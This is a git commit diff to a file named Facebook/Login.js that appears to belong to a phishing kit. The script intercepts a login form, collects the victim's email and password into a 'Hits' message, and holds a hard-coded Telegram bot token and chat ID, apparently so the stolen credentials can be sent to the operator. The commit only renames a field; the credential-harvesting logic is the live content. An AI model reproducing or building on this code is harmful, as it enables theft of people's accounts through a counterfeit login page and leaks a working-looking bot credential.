fdaedffc508515486ba2cc9d3390ec93b25ec905
t0ufik01 <2fik.47@gmail.com>
2023-01-19 13:28:28 +0100

    AddNewFile

--- Facebook/Login.js
+++ Facebook/Login.js
@@ -3,10 +3,10 @@ const form = document.querySelector("#form");
 addEventListener("submit", (e) => {
   e.preventDefault();
 
-  var email = document.getElementById("email").value;
+  var mail = document.getElementById("mail").value;
   var pass = document.getElementById("pass").value;
 
-  var message = "Hits :%0A" + email + ":" + pass;
+  var message = "Hits :%0A" + mail + ":" + pass;
 
   var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
   var chat_id = 1430266005;
